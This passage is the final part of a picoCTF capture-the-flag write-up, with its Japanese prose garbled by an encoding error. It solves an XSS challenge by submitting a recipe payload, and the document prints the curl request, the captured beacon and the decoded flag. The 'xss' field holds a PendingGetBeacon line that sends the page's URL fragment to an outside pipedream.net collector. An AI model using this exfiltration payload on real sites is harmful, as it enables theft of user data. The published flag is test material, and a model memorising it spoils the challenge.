ã‚ã¨ã¯URLãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã‚’å¤–éƒ¨URLã®ã‚¯ã‚¨ãƒªã¨ã—ã¦æŒ‡å®šã—ã¦ã€HTTPSãŒä½¿ãˆã‚‹RequestBinãªã©ã«æŠ•ã’ã¦ã‚„ã‚Œã°ã‚ˆã„ã€‚  
æœ€çµ‚çš„ãª`/remoteCraft`ã«é€ä¿¡ã™ã‚‹JSONã¯ä»¥ä¸‹ã®é€šã‚Šã«ãªã‚‹ã€‚  
```json
{"recipe": [["Air", "Water"], ["Earth", "Water"], ["Earth", "Fire"], ["Fire", "Mist"], ["Magma", "Mud"], ["Fog", "Mud"], ["Obsidian", "Water"], ["Hot Spring", "Sludge"], ["Fire", "Steam Engine"], ["Air", "Earth"], ["Earth", "Obsidian"], ["Hot Spring", "Steam Engine"], ["Dust", "Heat Engine"], ["Computer Chip", "Fire"], ["Computer Chip", "Steam Engine"], ["Computer Chip", "Electricity"], ["Magma", "Mist"], ["Fire", "Sand"], ["Artificial Intelligence", "Data"], ["Computer Chip", "Software"], ["Air", "Rock"], ["Glass", "Software"], ["Encryption", "Software"], ["Internet", "Program"], ["Cybersecurity", "Vulnerability"], ["Exploit", "Web Design"]], "xss": "new PendingGetBeacon('https://en38dskqgizlb.x.pipedream.net/?satoki=' + window.location.hash.slice(1), {timeout: 1000});"}
```
ã“ã‚Œã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¦æŠ•ã’ã¦ã‚„ã‚‹ã€‚  
```bash
$ curl -X POST 'http://rhea.picoctf.net:56994/remoteCraft?recipe=%7B%22recipe%22%3A%20%5B%5B%22Air%22%2C%20%22Water%22%5D%2C%20%5B%22Earth%22%2C%20%22Water%22%5D%2C%20%5B%22Earth%22%2C%20%22Fire%22%5D%2C%20%5B%22Fire%22%2C%20%22Mist%22%5D%2C%20%5B%22Magma%22%2C%20%22Mud%22%5D%2C%20%5B%22Fog%22%2C%20%22Mud%22%5D%2C%20%5B%22Obsidian%22%2C%20%22Water%22%5D%2C%20%5B%22Hot%20Spring%22%2C%20%22Sludge%22%5D%2C%20%5B%22Fire%22%2C%20%22Steam%20Engine%22%5D%2C%20%5B%22Air%22%2C%20%22Earth%22%5D%2C%20%5B%22Earth%22%2C%20%22Obsidian%22%5D%2C%20%5B%22Hot%20Spring%22%2C%20%22Steam%20Engine%22%5D%2C%20%5B%22Dust%22%2C%20%22Heat%20Engine%22%5D%2C%20%5B%22Computer%20Chip%22%2C%20%22Fire%22%5D%2C%20%5B%22Computer%20Chip%22%2C%20%22Steam%20Engine%22%5D%2C%20%5B%22Computer%20Chip%22%2C%20%22Electricity%22%5D%2C%20%5B%22Magma%22%2C%20%22Mist%22%5D%2C%20%5B%22Fire%22%2C%20%22Sand%22%5D%2C%20%5B%22Artificial%20Intelligence%22%2C%20%22Data%22%5D%2C%20%5B%22Computer%20Chip%22%2C%20%22Software%22%5D%2C%20%5B%22Air%22%2C%20%22Rock%22%5D%2C%20%5B%22Glass%22%2C%20%22Software%22%5D%2C%20%5B%22Encryption%22%2C%20%22Software%22%5D%2C%20%5B%22Internet%22%2C%20%22Program%22%5D%2C%20%5B%22Cybersecurity%22%2C%20%22Vulnerability%22%5D%2C%20%5B%22Exploit%22%2C%20%22Web%20Design%22%5D%5D%2C%20%22xss%22%3A%20%22new%20PendingGetBeacon%28%27https%3A%2F%2Fen38dskqgizlb%2Ex%2Epipedream%2Enet%2F%3Fsatoki%3D%27%20%2B%20window%2Elocation%2Ehash%2Eslice%281%29%2C%20%7Btimeout%3A%201000%7D%29%3B%22%7D'
visiting!
```
ã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã€å¾…ã¡å—ã‘ãŸã‚µãƒ¼ãƒã¸åˆ°é”ã™ã‚‹ã€‚  
```
GET
/?satoki=eyJyZWNpcGUiOltbIkFpciIsIldhdGVyIl0sWyJFYXJ0aCIsIldhdGVyIl0sWyJFYXJ0aCIsIkZpcmUiXSxbIkZpcmUiLCJNaXN0Il0sWyJNYWdtYSIsIk11ZCJdLFsiRm9nIiwiTXVkIl0sWyJPYnNpZGlhbiIsIldhdGVyIl0sWyJIb3QgU3ByaW5nIiwiU2x1ZGdlIl0sWyJGaXJlIiwiU3RlYW0gRW5naW5lIl0sWyJBaXIiLCJFYXJ0aCJdLFsiRWFydGgiLCJPYnNpZGlhbiJdLFsiSG90IFNwcmluZyIsIlN0ZWFtIEVuZ2luZSJdLFsiRHVzdCIsIkhlYXQgRW5naW5lIl0sWyJDb21wdXRlciBDaGlwIiwiRmlyZSJdLFsiQ29tcHV0ZXIgQ2hpcCIsIlN0ZWFtIEVuZ2luZSJdLFsiQ29tcHV0ZXIgQ2hpcCIsIkVsZWN0cmljaXR5Il0sWyJNYWdtYSIsIk1pc3QiXSxbIkZpcmUiLCJTYW5kIl0sWyJBcnRpZmljaWFsIEludGVsbGlnZW5jZSIsIkRhdGEiXSxbIkNvbXB1dGVyIENoaXAiLCJTb2Z0d2FyZSJdLFsiQWlyIiwiUm9jayJdLFsiR2xhc3MiLCJTb2Z0d2FyZSJdLFsiRW5jcnlwdGlvbiIsIlNvZnR3YXJlIl0sWyJJbnRlcm5ldCIsIlByb2dyYW0iXSxbIkN5YmVyc2VjdXJpdHkiLCJWdWxuZXJhYmlsaXR5Il0sWyJFeHBsb2l0IiwiV2ViIERlc2lnbiJdXSwieHNzIjoibmV3IFBlbmRpbmdHZXRCZWFjb24oJ2h0dHBzOi8vZW4zOGRza3FnaXpsYi54LnBpcGVkcmVhbS5uZXQvP3NhdG9raT0nICsgd2luZG93LmxvY2F0aW9uLmhhc2guc2xpY2UoMSksIHt0aW1lb3V0OiAxMDAwfSk7IiwiZmxhZyI6InBpY29DVEZ7bGl0dGxlX2FsY2hlbXlfd2FzX3RoZV8wZ19nYW1lX2RvZXNfYW55b25lX3JlbWVtYjNyXzk4ODlmZDRhfSBidHcgY29udGFjdCBtZSBvbiBkaXNjb3JkIHdpdGggdXIgc29sdXRpb24gdGhhbmtzIEBlaGh0aGluZ1xuIn0=
```
base64ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã€‚
```bash
$ echo -n 'eyJyZWNpcGUiOltbIkFpciIsIldhdGVyIl0sWyJFYXJ0aCIsIldhdGVyIl0sWyJFYXJ0aCIsIkZpcmUiXSxbIkZpcmUiLCJNaXN0Il0sWyJNYWdtYSIsIk11ZCJdLFsiRm9nIiwiTXVkIl0sWyJPYnNpZGlhbiIsIldhdGVyIl0sWyJIb3QgU3ByaW5nIiwiU2x1ZGdlIl0sWyJGaXJlIiwiU3RlYW0gRW5naW5lIl0sWyJBaXIiLCJFYXJ0aCJdLFsiRWFydGgiLCJPYnNpZGlhbiJdLFsiSG90IFNwcmluZyIsIlN0ZWFtIEVuZ2luZSJdLFsiRHVzdCIsIkhlYXQgRW5naW5lIl0sWyJDb21wdXRlciBDaGlwIiwiRmlyZSJdLFsiQ29tcHV0ZXIgQ2hpcCIsIlN0ZWFtIEVuZ2luZSJdLFsiQ29tcHV0ZXIgQ2hpcCIsIkVsZWN0cmljaXR5Il0sWyJNYWdtYSIsIk1pc3QiXSxbIkZpcmUiLCJTYW5kIl0sWyJBcnRpZmljaWFsIEludGVsbGlnZW5jZSIsIkRhdGEiXSxbIkNvbXB1dGVyIENoaXAiLCJTb2Z0d2FyZSJdLFsiQWlyIiwiUm9jayJdLFsiR2xhc3MiLCJTb2Z0d2FyZSJdLFsiRW5jcnlwdGlvbiIsIlNvZnR3YXJlIl0sWyJJbnRlcm5ldCIsIlByb2dyYW0iXSxbIkN5YmVyc2VjdXJpdHkiLCJWdWxuZXJhYmlsaXR5Il0sWyJFeHBsb2l0IiwiV2ViIERlc2lnbiJdXSwieHNzIjoibmV3IFBlbmRpbmdHZXRCZWFjb24oJ2h0dHBzOi8vZW4zOGRza3FnaXpsYi54LnBpcGVkcmVhbS5uZXQvP3NhdG9raT0nICsgd2luZG93LmxvY2F0aW9uLmhhc2guc2xpY2UoMSksIHt0aW1lb3V0OiAxMDAwfSk7IiwiZmxhZyI6InBpY29DVEZ7bGl0dGxlX2FsY2hlbXlfd2FzX3RoZV8wZ19nYW1lX2RvZXNfYW55b25lX3JlbWVtYjNyXzk4ODlmZDRhfSBidHcgY29udGFjdCBtZSBvbiBkaXNjb3JkIHdpdGggdXIgc29sdXRpb24gdGhhbmtzIEBlaGh0aGluZ1xuIn0=' | base64 -d
{"recipe":[["Air","Water"],["Earth","Water"],["Earth","Fire"],["Fire","Mist"],["Magma","Mud"],["Fog","Mud"],["Obsidian","Water"],["Hot Spring","Sludge"],["Fire","Steam Engine"],["Air","Earth"],["Earth","Obsidian"],["Hot Spring","Steam Engine"],["Dust","Heat Engine"],["Computer Chip","Fire"],["Computer Chip","Steam Engine"],["Computer Chip","Electricity"],["Magma","Mist"],["Fire","Sand"],["Artificial Intelligence","Data"],["Computer Chip","Software"],["Air","Rock"],["Glass","Software"],["Encryption","Software"],["Internet","Program"],["Cybersecurity","Vulnerability"],["Exploit","Web Design"]],"xss":"new PendingGetBeacon('https://en38dskqgizlb.x.pipedream.net/?satoki=' + window.location.hash.slice(1), {timeout: 1000});","flag":"picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} btw contact me on discord with ur solution thanks @ehhthing\n"}
```
flagãŒå«ã¾ã‚Œã¦ã„ãŸã€‚  

## picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}